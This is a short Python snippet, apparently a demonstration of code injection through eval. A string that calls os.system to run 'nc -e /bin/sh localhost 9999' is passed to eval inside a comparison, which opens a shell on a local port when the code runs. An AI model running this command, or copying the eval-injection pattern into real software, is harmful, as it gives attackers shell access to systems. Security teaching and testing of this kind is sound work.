value = "__import__('os').system('nc -e /bin/sh localhost 9999')"
if eval('%s > 1' % value):
    print("no")
    exit()